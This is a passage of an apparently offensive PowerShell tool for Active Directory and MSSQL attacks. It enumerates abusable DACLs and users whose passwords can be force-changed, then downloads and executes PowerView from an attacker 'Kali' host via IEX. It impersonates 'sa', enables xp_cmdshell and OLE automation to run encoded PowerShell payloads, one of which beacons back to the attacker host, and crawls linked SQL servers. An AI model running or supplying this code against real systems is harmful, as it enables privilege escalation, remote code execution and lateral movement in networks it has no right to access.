            $EnumOut = Get-DomainUser -Domain $Domain | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} |  Foreach-Object {if (($_.Identity -notmatch "BUILTIN|Enterprise Admins|Domain Admins|Principal Self|Local System|Key Admins|Cert Publishers") -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}}
            Write-Output $EnumOut | fl *

            Write-Output "[*] Enum Groups DACLs with GenericAll, GenericWrite etc. rights"
            $EnumOut = Get-DomainGroup -Domain $Domain | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -notmatch "BUILTIN|Enterprise Admins|Domain Admins|Principal Self|Local System|Key Admins|Cert Publishers") -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}}
            Write-Output $EnumOut | fl *

            Write-Output "[*] Enum Computers DACLs with GenericAll, GenericWrite etc. rights - Resource-Based Constrained Delegation"
            $EnumOut = Get-DomainComputer -Domain $Domain | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if (($_.Identity -notmatch "BUILTIN|Enterprise Admins|Domain Admins|Principal Self|Local System|Key Admins|Cert Publishers") -and ($_.ActiveDirectoryRights -match $DACLrights)) {$_}}
            Write-Output $EnumOut | fl *

            #password of user that can be changed
            Write-Output "[*] Users which password can be changed"
            $PassChangeUsers = $(Get-DomainUser -Domain $Domain | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName ObjectName -NotePropertyValue (ConvertFrom-SID $_.objectsid) -Force; $_} | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ((($_.Identity -notmatch "BUILTIN|Enterprise Admins|Domain Admins|Principal Self|Local System|Key Admins|Cert Publishers") ) -and ($_.ObjectAceType -match "User-Force-Change-Password")) {$_}})
            Write-Output $PassChangeUsers | fl *

            Write-Output "`n"
        }
    
        
        
        
    }

    Write-Output "`n"


}


function Invoke-MSSQLRecon {

    Param(

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $KaliIP

    )

    Write-Output "`n"
    Write-Output "###############################"
    Write-Output "###   MSSQL Servers Recon   ###"
    Write-Output "###############################"
    Write-Output "`n"

    $Domains=@()
    $DomainName = ""

    $currentuser = $env:USERNAME
    $CurrentDomain = $env:USERDOMAIN

    try 
    {
        (new-object system.net.webclient).downloadstring("http://$KaliIP/win/PowerView.ps1") | IEX
        $PowerView = $true
    }
    catch 
    {
        Write-Output "[!] Error downloading PowerView." 
        $PowerView = $false   
    }
    
    if ($PowerView) 
    {
        Write-Output ""
        $DomainName = Get-Domain | Select-Object -ExpandProperty Name # current user domain
        $Domains=Get-DomainTrustMapping | % {$_.SourceName} | Get-Unique
        Write-Output "Domains: $Domains"
        Write-Output ""
    }


    # Enumerate MS SQL
    if ($Domains.count -lt 1) {$Domains = @($DomainName)}
    Write-Output "[*] Domains for MSSQL enumeration: $Domains"
    Write-Output ""
  
    $MSSQLServers = @()
    Write-Output "[*] Enumerate all MSSQL SPNs in $Domain"
    foreach ($Domain in $Domains) {
        
        #setspn -T $Domain -Q MSSQL*/*
        #Write-Output ""

        $MSSQLServers += setspn -T $Domain -Q  MSSQL*/* | findstr "MSSQL" | % {($_ -Split ":")[0]} | % {($_ -Split "/")[1]} | Get-Unique 
    }
    Write-Output ""

    Write-Output "[*] All unique MS SQL Servers ($($MSSQLServers.Count)): $MSSQLServers"
    Write-Output "`n"

    #Connecting to database with current domain user
    foreach ($MSS in $MSSQLServers) {
        Write-Output ""
        Write-Output "*****************************************************"
        Write-Output "[*] Connecting to MS SQL $MSS server as $CurrentDomain\$currentuser"
        Write-Output "*****************************************************"
        Write-Output ""

        $sqlServer = $MSS
        $databse = "master"
        $conString = "Server = " + $sqlServer + "; Database = " + $database + "; Integrated Security = True;"   

        $con = New-Object System.Data.SqlClient.sqlConnection
        $con.ConnectionString = $conString
        try {
            $con.Open();
            Write-Output "[+] Auth success!"
            Write-Output ""
        }
        catch {
            Write-Output "[+] Auth failed!"
            Write-Output ""
            continue
        }
        

        $querylogin = "SELECT SYSTEM_USER;";
        $command = New-Object System.Data.SqlClient.SqlCommand($querylogin,$con)
        $reader = $command.ExecuteReader()
        $a = $reader.Read()
        Write-Output "Logged in as: $($reader[0])"
        $reader.Close()

        $queryuser = "SELECT USER_NAME();";
        $command = New-Object System.Data.SqlClient.SqlCommand($queryuser,$con)
        $reader = $command.ExecuteReader()
        $a = $reader.Read()
        Write-Output "Mapped to user: $($reader[0])"
        $reader.Close()

        $querypublicrole = "SELECT IS_SRVROLEMEMBER('public');"
        $command = New-Object System.Data.SqlClient.SqlCommand($querypublicrole,$con)
        $reader = $command.ExecuteReader()
        $a = $reader.Read()
        $role = $reader[0]
        if ($role -eq 1) {
            Write-Output "[+] User is a member of public role."
        }
        else {
            Write-Output "[-] User is not a member of public role."
        }
        $reader.Close()    
    
        $querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');"
        $command = New-Object System.Data.SqlClient.SqlCommand($querysysadminrole,$con)
        $reader = $command.ExecuteReader()
        $a = $reader.Read()
        $role = $reader[0]
        if ($role -eq 1) {
            Write-Output "[+] User is a member of sysadmin role."
        }
        else {
            Write-Output "[-] User is not a member of sysadmin role."
        }
        $reader.Close() 
        Write-Output ""


        Write-Output "[*] Checking login impersonation"
        $query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
        $command = New-Object System.Data.SqlClient.SqlCommand($query,$con)
        $reader = $command.ExecuteReader()
        $ImpersonateLogins = @()
        while ($reader.Read()) {
            $ImpersonateLogins += $reader[0]
        }
        $reader.Close()

        Write-Output "[*] Logins that can be impersonated ($($ImpersonateLogins.Count)): $ImpersonateLogins"

        if ($ImpersonateLogins.count -eq 0) { 
            Write-Output "      [-] No Logins to impersonate!"
        }

        foreach ($Login in $ImpersonateLogins) {
            try {
                $executeaslogin = "EXECUTE AS LOGIN = '$Login'; SELECT SYSTEM_USER; REVERT;"
                
                $command = New-Object System.Data.SqlClient.SqlCommand($executeaslogin,$con)
                $reader = $command.ExecuteReader()
                while ($reader.Read()) {
                    Write-Output "[+] After impersonation"
                    Write-Output "[+] Executing in the context of: $($reader[0])"
                }
                $reader.Close()
                Write-Output ""
            }
            catch {
                Write-Output "[-] Cannot Impersonate $Login login"
            }
        }
        Write-Output ""


        Write-Output "[*] Checking dbo user impersonation for msdb"
        try {
            $executeasuser = "use msdb; EXECUTE AS USER = 'dbo'; SELECT USER_NAME(); REVERT;";
            
            $command = New-Object System.Data.SqlClient.SqlCommand($executeasuser,$con)
            $reader = $command.ExecuteReader()
            while ($reader.Read()) {
                Write-Output "[+] After impersonation"
                Write-Output "[+] Executing in the context of user: $($reader[0])"
            }
            $reader.Close()
            Write-Output ""
        }
        catch {
            Write-Output "[-] Cannot Impersonate dbo user on msdb"
        }
        Write-Output ""

        # Cmd execution enabled checks
        Write-Output "[*] Checking cmd execution with xp_cmdshell"

        $ua = "@{'User-Agent' = 'Cmd check'}"
        $payload = "hostname; whoami;";
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
        $EncodedPayload = [Convert]::ToBase64String($bytes)
        
        # xp_cmdshell
        $impersonateUser = "EXECUTE AS LOGIN = 'sa';";
        $revert = "REVERT;"

        $enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
        #$execCmd = "EXEC xp_cmdshell whoami";
        $execCmd = "EXEC xp_cmdshell 'powershell -enc $EncodedPayload'";

        try{
            $command = New-Object System.Data.SqlClient.SqlCommand($impersonateUser ,$con)
            $reader = $command.ExecuteReader()
            Write-Output "[+] Imperasonated sa on $MSS"
            $reader.Close()
        }
        catch{
            Write-Output "[-] Cannot imperasonate sa on $MSS"
        }

        try {
            $command = New-Object System.Data.SqlClient.SqlCommand($enable_xpcmd,$con)
            $reader = $command.ExecuteReader()
            $reader.Close()
        }
        catch{
            Write-Output "[-] Cannot enable xp_cmdshell on $MSS"
        }

        try {
            $command = New-Object System.Data.SqlClient.SqlCommand($execCmd ,$con)
            $reader = $command.ExecuteReader()
            while ($reader.Read()) {
                Write-Output "Cmd on $MSS payload $payload output: $($reader[0])"
            }
            $reader.Close()
        }
        catch {
            Write-Output "[-] Cannot run xp_cmdshell on $MSS"
        }
        try {
            $command = New-Object System.Data.SqlClient.SqlCommand($revert,$con)
            $reader = $command.ExecuteReader()
            $reader.Close()
        }
        catch {}
        Write-Output ""


        Write-Output "[*] Checking cmd execution with sp_oacreate"
        #sp_oacreate
        $payload = "(Invoke-RestMethod -Uri 'http://$KaliIP/test.txt' -Headers @{'User-Agent' = 'Cmd check sp_configure'} ).StatusCode";
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
        $EncodedPayload = [Convert]::ToBase64String($bytes)


        $enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
        $execCmdOle = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc $EncodedPayload';";

        try{
            $command = New-Object System.Data.SqlClient.SqlCommand($impersonateUser ,$con)
            $reader = $command.ExecuteReader()
            Write-Output "[+] Imperasonated sa on $MSS"
            $reader.Close()
        }
        catch{
            Write-Output "[-] Cannot imperasonate sa on $MSS"
        }
        try 
        {
            $command = New-Object System.Data.SqlClient.SqlCommand($enable_ole,$con)
            $reader = $command.ExecuteReader()
            $reader.Close()
        }
        catch{
            Write-Output "[-] Cannot enable sp_oacreate on $MSS"
        }

        try {
            $command = New-Object System.Data.SqlClient.SqlCommand($execCmdOle ,$con)
            $reader = $command.ExecuteReader()
            while ($reader.Read()) {
                Write-Output "[+] Cmd on $MSS payload $payload output: $($reader[0])"
                Write-Output "[+] Check server logs"
            }
            $reader.Close()
        }
        catch {
            Write-Output "[-] Cannot run sp_oacreate on $MSS"
        }
        try {
            $command = New-Object System.Data.SqlClient.SqlCommand($revert,$con)
            $reader = $command.ExecuteReader()
            $reader.Close()
        }
        catch {}
        Write-Output ""
    

        #####
        # Linked sql servers
        #####
        Write-Output "[*] Checking linked MS SQL servers"
        $executeasuser = "EXEC sp_linkedservers;";
        
        $command = New-Object System.Data.SqlClient.SqlCommand($executeasuser,$con)
        $reader = $command.ExecuteReader()

        $LinkedServers = @()
        $LinkedServers1 = @()
        while ($reader.Read()) {
            #if ( $(($reader[0] -Split "\\")[0].ToLower()) -ne $($MSS -Split "\.")[0].ToLower()  ) {
                $LinkedServers1 += $reader[0]
            #}            
        }
        $reader.Close()


        Write-Output ""
        Write-Output "[*] Linked servers found [$($LinkedServers1.Count)]: $LinkedServers1"
        Write-Output ""

        Write-output "[*] LS Enumeration"
        Write-Output ""
        foreach ($LinkedServer in $LinkedServers1) {
            #
            $LinkedServer = ($LinkedServer -Split "\\")[0].ToLower() 
            if ($LinkedServer -eq $($MSS -Split "\.")[0].ToLower() ){
                Write-Output "[!] Linked server ($LinkedServer) the same as current server ($MSS)!"
                continue
            }

            Write-Output "[*] Checking $LinkedServer linked server: $MSS -> $LinkedServer"
            Write-output ""
            $querylogin = "select login from openquery([$LinkedServer], 'select SYSTEM_USER as login')";
            $command = New-Object System.Data.SqlClient.SqlCommand($querylogin,$con)
            $reader = $command.ExecuteReader()
            if ($reader.Read()) {
                Write-Output "[+] Logged in as: $($reader[0]) on $LinkedServer"
            }
            
            $reader.Close()

            
            $querylogin = "select usr from openquery([$LinkedServer], 'select USER_NAME() as usr')";
            $command = New-Object System.Data.SqlClient.SqlCommand($querylogin,$con)
            $reader = $command.ExecuteReader()
            if ($reader.Read()) {
                Write-Output "[+] Mapped to user: $($reader[0]) on $LinkedServer"
            }
            
            $reader.Close()
            Write-Output ""


            #linked servers on linked server
            Write-output "LS Linked servers"
            $query = "EXEC ('sp_linkedservers') AT [$LinkedServer]";
            $command = New-Object System.Data.SqlClient.SqlCommand($query,$con)
            $reader = $command.ExecuteReader()
            $LinkedLinkServers = @()
            while ($reader.Read()) {
                if ( $(($reader[0] -Split "\\")[0].ToLower()) -ne ($LinkedServer.ToLower())) {
                    $LinkedLinkServers += $reader[0]
                }
                Write-Output "[*] Linked server: $($reader[0])"
            }
            Write-Output ""

            $reader.Close()

            # Enumeration of Linked servers via linked server
            Write-Output "[*] LLS enumeration"
            Write-Output ""
            foreach ($lls in $LinkedLinkServers) {
                
                Write-Output "[*] Checking $MSS -> $LinkedServer -> $lls"
                Write-Output ""
                
              
                $query = "select login from openquery([$LinkedServer], 'select login from openquery([$lls], ''select SYSTEM_USER as login'')')";
                #Write-Output "Query: $query"
                $command = New-Object System.Data.SqlClient.SqlCommand($query,$con)
                $reader = $command.ExecuteReader()
                if ($reader.Read()) {
                    Write-Output "[+] Logged in as: $($reader[0]) on $lls"
                }
                
                $reader.Close()
            

                #`select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", ''select SYSTEM_USER as mylogin'')')`
                
                $querylogin = "select usr from openquery([$LinkedServer], 'select usr from openquery([$lls], ''select USER_NAME() as usr'')')";
                #Write-Output "Query: $query"
                $command = New-Object System.Data.SqlClient.SqlCommand($query,$con)
                $reader = $command.ExecuteReader()
                if ($reader.Read()) {
                    Write-Output "[+] Mapped to user: $($reader[0]) on $lls"
                }
                
                $reader.Close()
                
            
                Write-Output ""

            }

            
           
            Write-Output "`n"
        }


        $con.Close()
        
    }
    
}
